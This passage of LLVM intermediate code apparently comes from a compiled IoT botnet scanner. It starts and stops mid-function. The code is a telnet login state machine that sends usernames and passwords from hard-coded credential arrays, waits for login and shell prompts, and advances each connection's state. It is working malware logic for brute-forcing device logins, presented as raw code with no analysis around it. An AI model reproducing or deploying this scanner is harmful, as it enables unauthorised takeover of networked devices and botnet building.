  %501 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %502 = icmp ult i32 %499, %501
  br i1 %502, label %503, label %518

; <label>:503:                                    ; preds = %491
  %504 = load i32, i32* %4, align 4
  %505 = sext i32 %504 to i64
  %506 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %505
  %507 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %506, i32 0, i32 0
  %508 = load i32, i32* %507, align 16
  %509 = call i32 @sclose(i32 %508)
  %510 = load i32, i32* %4, align 4
  %511 = sext i32 %510 to i64
  %512 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %511
  %513 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %512, i32 0, i32 2
  store i8 0, i8* %513, align 8
  %514 = load i32, i32* %4, align 4
  %515 = sext i32 %514 to i64
  %516 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %515
  %517 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %516, i32 0, i32 3
  store i8 1, i8* %517, align 1
  br label %518

; <label>:518:                                    ; preds = %503, %491
  br label %1222

; <label>:519:                                    ; preds = %73
  %520 = load i32, i32* %4, align 4
  %521 = sext i32 %520 to i64
  %522 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %521
  %523 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %522, i32 0, i32 0
  %524 = load i32, i32* %523, align 16
  %525 = load i32, i32* %4, align 4
  %526 = sext i32 %525 to i64
  %527 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %526
  %528 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %527, i32 0, i32 4
  %529 = load i8, i8* %528, align 2
  %530 = zext i8 %529 to i64
  %531 = getelementptr inbounds [6 x i8*], [6 x i8*]* @usernames, i64 0, i64 %530
  %532 = load i8*, i8** %531, align 8
  %533 = load i32, i32* %4, align 4
  %534 = sext i32 %533 to i64
  %535 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %534
  %536 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %535, i32 0, i32 4
  %537 = load i8, i8* %536, align 2
  %538 = zext i8 %537 to i64
  %539 = getelementptr inbounds [6 x i8*], [6 x i8*]* @usernames, i64 0, i64 %538
  %540 = load i8*, i8** %539, align 8
  %541 = call i64 @strlen(i8* %540) #10
  %542 = call i64 @send(i32 %524, i8* %532, i64 %541, i32 16384)
  %543 = icmp slt i64 %542, 0
  br i1 %543, label %544, label %559

; <label>:544:                                    ; preds = %519
  %545 = load i32, i32* %4, align 4
  %546 = sext i32 %545 to i64
  %547 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %546
  %548 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %547, i32 0, i32 0
  %549 = load i32, i32* %548, align 16
  %550 = call i32 @sclose(i32 %549)
  %551 = load i32, i32* %4, align 4
  %552 = sext i32 %551 to i64
  %553 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %552
  %554 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %553, i32 0, i32 2
  store i8 0, i8* %554, align 8
  %555 = load i32, i32* %4, align 4
  %556 = sext i32 %555 to i64
  %557 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %556
  %558 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %557, i32 0, i32 3
  store i8 1, i8* %558, align 1
  br label %1223

; <label>:559:                                    ; preds = %519
  %560 = load i32, i32* %4, align 4
  %561 = sext i32 %560 to i64
  %562 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %561
  %563 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %562, i32 0, i32 0
  %564 = load i32, i32* %563, align 16
  %565 = call i64 @send(i32 %564, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.26, i32 0, i32 0), i64 2, i32 16384)
  %566 = icmp slt i64 %565, 0
  br i1 %566, label %567, label %582

; <label>:567:                                    ; preds = %559
  %568 = load i32, i32* %4, align 4
  %569 = sext i32 %568 to i64
  %570 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %569
  %571 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %570, i32 0, i32 0
  %572 = load i32, i32* %571, align 16
  %573 = call i32 @sclose(i32 %572)
  %574 = load i32, i32* %4, align 4
  %575 = sext i32 %574 to i64
  %576 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %575
  %577 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %576, i32 0, i32 2
  store i8 0, i8* %577, align 8
  %578 = load i32, i32* %4, align 4
  %579 = sext i32 %578 to i64
  %580 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %579
  %581 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %580, i32 0, i32 3
  store i8 1, i8* %581, align 1
  br label %1223

; <label>:582:                                    ; preds = %559
  %583 = load i32, i32* %4, align 4
  %584 = sext i32 %583 to i64
  %585 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %584
  %586 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %585, i32 0, i32 2
  store i8 4, i8* %586, align 8
  br label %1222

; <label>:587:                                    ; preds = %73
  %588 = load i32, i32* %4, align 4
  %589 = sext i32 %588 to i64
  %590 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %589
  %591 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %590, i32 0, i32 6
  %592 = load i32, i32* %591, align 4
  %593 = icmp eq i32 %592, 0
  br i1 %593, label %594, label %600

; <label>:594:                                    ; preds = %587
  %595 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %596 = load i32, i32* %4, align 4
  %597 = sext i32 %596 to i64
  %598 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %597
  %599 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %598, i32 0, i32 6
  store i32 %595, i32* %599, align 4
  br label %600

; <label>:600:                                    ; preds = %594, %587
  %601 = load i32, i32* %4, align 4
  %602 = sext i32 %601 to i64
  %603 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %602
  %604 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %603, i32 0, i32 0
  %605 = load i32, i32* %604, align 16
  %606 = load i32, i32* %4, align 4
  %607 = sext i32 %606 to i64
  %608 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %607
  %609 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %608, i32 0, i32 8
  %610 = load i8*, i8** %609, align 8
  %611 = load i32, i32* %4, align 4
  %612 = sext i32 %611 to i64
  %613 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %612
  %614 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %613, i32 0, i32 7
  %615 = load i16, i16* %614, align 16
  %616 = zext i16 %615 to i32
  %617 = call i32 @readUntil(i32 %605, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.27, i32 0, i32 0), i32 1, i32 0, i32 10000, i8* %610, i32 1024, i32 %616)
  %618 = icmp ne i32 %617, 0
  br i1 %618, label %619, label %651

; <label>:619:                                    ; preds = %600
  %620 = load i32, i32* %4, align 4
  %621 = sext i32 %620 to i64
  %622 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %621
  %623 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %622, i32 0, i32 6
  store i32 0, i32* %623, align 4
  %624 = load i32, i32* %4, align 4
  %625 = sext i32 %624 to i64
  %626 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %625
  %627 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %626, i32 0, i32 7
  store i16 0, i16* %627, align 16
  %628 = load i32, i32* %4, align 4
  %629 = sext i32 %628 to i64
  %630 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %629
  %631 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %630, i32 0, i32 8
  %632 = load i8*, i8** %631, align 8
  %633 = call i8* @strstr(i8* %632, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.27, i32 0, i32 0)) #10
  %634 = icmp ne i8* %633, null
  br i1 %634, label %635, label %640

; <label>:635:                                    ; preds = %619
  %636 = load i32, i32* %4, align 4
  %637 = sext i32 %636 to i64
  %638 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %637
  %639 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %638, i32 0, i32 2
  store i8 5, i8* %639, align 8
  br label %645

; <label>:640:                                    ; preds = %619
  %641 = load i32, i32* %4, align 4
  %642 = sext i32 %641 to i64
  %643 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %642
  %644 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %643, i32 0, i32 2
  store i8 100, i8* %644, align 8
  br label %645

; <label>:645:                                    ; preds = %640, %635
  %646 = load i32, i32* %4, align 4
  %647 = sext i32 %646 to i64
  %648 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %647
  %649 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %648, i32 0, i32 8
  %650 = load i8*, i8** %649, align 8
  call void @llvm.memset.p0i8.i64(i8* %650, i8 0, i64 1024, i32 1, i1 false)
  br label %1223

; <label>:651:                                    ; preds = %600
  %652 = load i32, i32* %4, align 4
  %653 = sext i32 %652 to i64
  %654 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %653
  %655 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %654, i32 0, i32 8
  %656 = load i8*, i8** %655, align 8
  %657 = call i8* @strstr(i8* %656, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.28, i32 0, i32 0)) #10
  %658 = icmp ne i8* %657, null
  br i1 %658, label %659, label %674

; <label>:659:                                    ; preds = %651
  %660 = load i32, i32* %4, align 4
  %661 = sext i32 %660 to i64
  %662 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %661
  %663 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %662, i32 0, i32 0
  %664 = load i32, i32* %663, align 16
  %665 = call i32 @sclose(i32 %664)
  %666 = load i32, i32* %4, align 4
  %667 = sext i32 %666 to i64
  %668 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %667
  %669 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %668, i32 0, i32 2
  store i8 0, i8* %669, align 8
  %670 = load i32, i32* %4, align 4
  %671 = sext i32 %670 to i64
  %672 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %671
  %673 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %672, i32 0, i32 3
  store i8 0, i8* %673, align 1
  br label %1223

; <label>:674:                                    ; preds = %651
  %675 = load i32, i32* %4, align 4
  %676 = sext i32 %675 to i64
  %677 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %676
  %678 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %677, i32 0, i32 8
  %679 = load i8*, i8** %678, align 8
  %680 = call i64 @strlen(i8* %679) #10
  %681 = trunc i64 %680 to i16
  %682 = load i32, i32* %4, align 4
  %683 = sext i32 %682 to i64
  %684 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %683
  %685 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %684, i32 0, i32 7
  store i16 %681, i16* %685, align 16
  br label %686

; <label>:686:                                    ; preds = %674
  %687 = load i32, i32* %4, align 4
  %688 = sext i32 %687 to i64
  %689 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %688
  %690 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %689, i32 0, i32 6
  %691 = load i32, i32* %690, align 4
  %692 = sub i32 0, %691
  %693 = sub i32 0, 8
  %694 = add i32 %692, %693
  %695 = sub i32 0, %694
  %696 = add i32 %691, 8
  %697 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %698 = icmp ult i32 %695, %697
  br i1 %698, label %699, label %714

; <label>:699:                                    ; preds = %686
  %700 = load i32, i32* %4, align 4
  %701 = sext i32 %700 to i64
  %702 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %701
  %703 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %702, i32 0, i32 0
  %704 = load i32, i32* %703, align 16
  %705 = call i32 @sclose(i32 %704)
  %706 = load i32, i32* %4, align 4
  %707 = sext i32 %706 to i64
  %708 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %707
  %709 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %708, i32 0, i32 2
  store i8 0, i8* %709, align 8
  %710 = load i32, i32* %4, align 4
  %711 = sext i32 %710 to i64
  %712 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %711
  %713 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %712, i32 0, i32 3
  store i8 1, i8* %713, align 1
  br label %714

; <label>:714:                                    ; preds = %699, %686
  br label %1222

; <label>:715:                                    ; preds = %73
  %716 = load i32, i32* %4, align 4
  %717 = sext i32 %716 to i64
  %718 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %717
  %719 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %718, i32 0, i32 0
  %720 = load i32, i32* %719, align 16
  %721 = load i32, i32* %4, align 4
  %722 = sext i32 %721 to i64
  %723 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %722
  %724 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %723, i32 0, i32 5
  %725 = load i8, i8* %724, align 1
  %726 = zext i8 %725 to i64
  %727 = getelementptr inbounds [14 x i8*], [14 x i8*]* @passwords, i64 0, i64 %726
  %728 = load i8*, i8** %727, align 8
  %729 = load i32, i32* %4, align 4
  %730 = sext i32 %729 to i64
  %731 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %730
  %732 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %731, i32 0, i32 5
  %733 = load i8, i8* %732, align 1
  %734 = zext i8 %733 to i64
  %735 = getelementptr inbounds [14 x i8*], [14 x i8*]* @passwords, i64 0, i64 %734
  %736 = load i8*, i8** %735, align 8
  %737 = call i64 @strlen(i8* %736) #10
  %738 = call i64 @send(i32 %720, i8* %728, i64 %737, i32 16384)
  %739 = icmp slt i64 %738, 0
  br i1 %739, label %740, label %755

; <label>:740:                                    ; preds = %715
  %741 = load i32, i32* %4, align 4
  %742 = sext i32 %741 to i64
  %743 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %742
  %744 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %743, i32 0, i32 0
  %745 = load i32, i32* %744, align 16
  %746 = call i32 @sclose(i32 %745)
  %747 = load i32, i32* %4, align 4
  %748 = sext i32 %747 to i64
  %749 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %748
  %750 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %749, i32 0, i32 2
  store i8 0, i8* %750, align 8
  %751 = load i32, i32* %4, align 4
  %752 = sext i32 %751 to i64
  %753 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %752
  %754 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %753, i32 0, i32 3
  store i8 1, i8* %754, align 1
  br label %1223

; <label>:755:                                    ; preds = %715
  %756 = load i32, i32* %4, align 4
  %757 = sext i32 %756 to i64
  %758 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %757
  %759 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %758, i32 0, i32 0
  %760 = load i32, i32* %759, align 16
  %761 = call i64 @send(i32 %760, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.26, i32 0, i32 0), i64 2, i32 16384)
  %762 = icmp slt i64 %761, 0
  br i1 %762, label %763, label %778

; <label>:763:                                    ; preds = %755
  %764 = load i32, i32* %4, align 4
  %765 = sext i32 %764 to i64
  %766 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %765
  %767 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %766, i32 0, i32 0
  %768 = load i32, i32* %767, align 16
  %769 = call i32 @sclose(i32 %768)
  %770 = load i32, i32* %4, align 4
  %771 = sext i32 %770 to i64
  %772 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %771
  %773 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %772, i32 0, i32 2
  store i8 0, i8* %773, align 8
  %774 = load i32, i32* %4, align 4
  %775 = sext i32 %774 to i64
  %776 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %775
  %777 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %776, i32 0, i32 3
  store i8 1, i8* %777, align 1
  br label %1223

; <label>:778:                                    ; preds = %755
  %779 = load i32, i32* %4, align 4
  %780 = sext i32 %779 to i64
  %781 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %780
  %782 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %781, i32 0, i32 2
  store i8 6, i8* %782, align 8
  br label %1222

; <label>:783:                                    ; preds = %73
  %784 = load i32, i32* %4, align 4
  %785 = sext i32 %784 to i64
  %786 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %785
  %787 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %786, i32 0, i32 6
  %788 = load i32, i32* %787, align 4
  %789 = icmp eq i32 %788, 0
  br i1 %789, label %790, label %796

; <label>:790:                                    ; preds = %783
  %791 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %792 = load i32, i32* %4, align 4
  %793 = sext i32 %792 to i64
  %794 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %793
  %795 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %794, i32 0, i32 6
  store i32 %791, i32* %795, align 4
  br label %796

; <label>:796:                                    ; preds = %790, %783
  %797 = load i32, i32* %4, align 4
  %798 = sext i32 %797 to i64
  %799 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %798
  %800 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %799, i32 0, i32 0
  %801 = load i32, i32* %800, align 16
  %802 = load i32, i32* %4, align 4
  %803 = sext i32 %802 to i64
  %804 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %803
  %805 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %804, i32 0, i32 8
  %806 = load i8*, i8** %805, align 8
  %807 = load i32, i32* %4, align 4
  %808 = sext i32 %807 to i64
  %809 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %808
  %810 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %809, i32 0, i32 7
  %811 = load i16, i16* %810, align 16
  %812 = zext i16 %811 to i32
  %813 = call i32 @readUntil(i32 %801, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.28, i32 0, i32 0), i32 1, i32 0, i32 10000, i8* %806, i32 1024, i32 %812)
  %814 = icmp ne i32 %813, 0
  br i1 %814, label %815, label %890

; <label>:815:                                    ; preds = %796
  %816 = load i32, i32* %4, align 4
  %817 = sext i32 %816 to i64
  %818 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %817
  %819 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %818, i32 0, i32 6
  store i32 0, i32* %819, align 4
  %820 = load i32, i32* %4, align 4
  %821 = sext i32 %820 to i64
  %822 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %821
  %823 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %822, i32 0, i32 7
  store i16 0, i16* %823, align 16
  %824 = load i32, i32* %4, align 4
  %825 = sext i32 %824 to i64
  %826 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %825
  %827 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %826, i32 0, i32 8
  %828 = load i8*, i8** %827, align 8
  %829 = call i8* @strstr(i8* %828, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.28, i32 0, i32 0)) #10
  %830 = icmp ne i8* %829, null
  br i1 %830, label %831, label %851

; <label>:831:                                    ; preds = %815
  %832 = load i32, i32* %4, align 4
  %833 = sext i32 %832 to i64
  %834 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %833
  %835 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %834, i32 0, i32 8
  %836 = load i8*, i8** %835, align 8
  call void @llvm.memset.p0i8.i64(i8* %836, i8 0, i64 1024, i32 1, i1 false)
  %837 = load i32, i32* %4, align 4
  %838 = sext i32 %837 to i64
  %839 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %838
  %840 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %839, i32 0, i32 0
  %841 = load i32, i32* %840, align 16
  %842 = call i32 @sclose(i32 %841)
  %843 = load i32, i32* %4, align 4
  %844 = sext i32 %843 to i64
  %845 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %844
  %846 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %845, i32 0, i32 2
  store i8 0, i8* %846, align 8
  %847 = load i32, i32* %4, align 4
  %848 = sext i32 %847 to i64
  %849 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %848
  %850 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %849, i32 0, i32 3
  store i8 0, i8* %850, align 1
  br label %1223

; <label>:851:                                    ; preds = %815
  %852 = load i32, i32* %4, align 4
  %853 = sext i32 %852 to i64
  %854 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %853
  %855 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %854, i32 0, i32 8
  %856 = load i8*, i8** %855, align 8
  %857 = call i32 @matchPrompt(i8* %856)
  %858 = icmp ne i32 %857, 0
  br i1 %858, label %879, label %859

; <label>:859:                                    ; preds = %851
  %860 = load i32, i32* %4, align 4
  %861 = sext i32 %860 to i64
  %862 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %861
  %863 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %862, i32 0, i32 8
  %864 = load i8*, i8** %863, align 8
  call void @llvm.memset.p0i8.i64(i8* %864, i8 0, i64 1024, i32 1, i1 false)
  %865 = load i32, i32* %4, align 4
  %866 = sext i32 %865 to i64
  %867 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %866
  %868 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %867, i32 0, i32 0
  %869 = load i32, i32* %868, align 16
  %870 = call i32 @sclose(i32 %869)
  %871 = load i32, i32* %4, align 4
  %872 = sext i32 %871 to i64
  %873 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %872
  %874 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %873, i32 0, i32 2
  store i8 0, i8* %874, align 8
  %875 = load i32, i32* %4, align 4
  %876 = sext i32 %875 to i64
  %877 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %876
  %878 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %877, i32 0, i32 3
  store i8 1, i8* %878, align 1
  br label %1223

; <label>:879:                                    ; preds = %851
  %880 = load i32, i32* %4, align 4
  %881 = sext i32 %880 to i64
  %882 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %881
  %883 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %882, i32 0, i32 2
  store i8 7, i8* %883, align 8
  br label %884

; <label>:884:                                    ; preds = %879
  %885 = load i32, i32* %4, align 4
  %886 = sext i32 %885 to i64
  %887 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %886
  %888 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %887, i32 0, i32 8
  %889 = load i8*, i8** %888, align 8
  call void @llvm.memset.p0i8.i64(i8* %889, i8 0, i64 1024, i32 1, i1 false)
  br label %1223

; <label>:890:                                    ; preds = %796
  %891 = load i32, i32* %4, align 4
  %892 = sext i32 %891 to i64
  %893 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %892
  %894 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %893, i32 0, i32 8
  %895 = load i8*, i8** %894, align 8
  %896 = call i64 @strlen(i8* %895) #10
  %897 = trunc i64 %896 to i16
  %898 = load i32, i32* %4, align 4
  %899 = sext i32 %898 to i64
  %900 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %899
  %901 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %900, i32 0, i32 7
  store i16 %897, i16* %901, align 16
  br label %902

; <label>:902:                                    ; preds = %890
  %903 = load i32, i32* %4, align 4
  %904 = sext i32 %903 to i64
  %905 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %904
  %906 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %905, i32 0, i32 6
  %907 = load i32, i32* %906, align 4
  %908 = sub i32 0, 30
  %909 = sub i32 %907, %908
  %910 = add i32 %907, 30
  %911 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %912 = icmp ult i32 %909, %911
  br i1 %912, label %913, label %928

; <label>:913:                                    ; preds = %902
  %914 = load i32, i32* %4, align 4
  %915 = sext i32 %914 to i64
  %916 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %915
  %917 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %916, i32 0, i32 0
  %918 = load i32, i32* %917, align 16
  %919 = call i32 @sclose(i32 %918)
  %920 = load i32, i32* %4, align 4
  %921 = sext i32 %920 to i64
  %922 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %921
  %923 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %922, i32 0, i32 2
  store i8 0, i8* %923, align 8
  %924 = load i32, i32* %4, align 4
  %925 = sext i32 %924 to i64
  %926 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %925
  %927 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %926, i32 0, i32 3
  store i8 1, i8* %927, align 1
  br label %928

; <label>:928:                                    ; preds = %913, %902
  br label %1222

; <label>:929:                                    ; preds = %73
  %930 = load i32, i32* %4, align 4
  %931 = sext i32 %930 to i64
  %932 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %931
  %933 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %932, i32 0, i32 0
  %934 = load i32, i32* %933, align 16
  %935 = call i64 @send(i32 %934, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.29, i32 0, i32 0), i64 4, i32 16384)
  %936 = icmp slt i64 %935, 0
  br i1 %936, label %937, label %952

; <label>:937:                                    ; preds = %929
  %938 = load i32, i32* %4, align 4
  %939 = sext i32 %938 to i64
  %940 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %939
  %941 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %940, i32 0, i32 0
  %942 = load i32, i32* %941, align 16
  %943 = call i32 @sclose(i32 %942)
  %944 = load i32, i32* %4, align 4
  %945 = sext i32 %944 to i64
  %946 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %945
  %947 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %946, i32 0, i32 2
  store i8 0, i8* %947, align 8
  %948 = load i32, i32* %4, align 4
  %949 = sext i32 %948 to i64
  %950 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %949
  %951 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %950, i32 0, i32 3
  store i8 1, i8* %951, align 1
  br label %1223

; <label>:952:                                    ; preds = %929
  %953 = load i32, i32* %4, align 4
  %954 = sext i32 %953 to i64
  %955 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %954
  %956 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %955, i32 0, i32 2
  store i8 8, i8* %956, align 8
  br label %1222

; <label>:957:                                    ; preds = %73
  %958 = load i32, i32* %4, align 4
  %959 = sext i32 %958 to i64
  %960 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %959
  %961 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %960, i32 0, i32 0
  %962 = load i32, i32* %961, align 16
  %963 = call i64 @send(i32 %962, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.30, i32 0, i32 0), i64 7, i32 16384)
  %964 = icmp slt i64 %963, 0
  br i1 %964, label %965, label %980

; <label>:965:                                    ; preds = %957
  %966 = load i32, i32* %4, align 4
  %967 = sext i32 %966 to i64
  %968 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %34, i64 %967
  %969 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %968, i32 0, i32 0
  %970 = load i32, i32* %969, align 16
  %971 = call i32 @sclose(i32 %970)
  %972 = load i32, i32* %4, align 4
  %973 = sext i32 %972 to i64
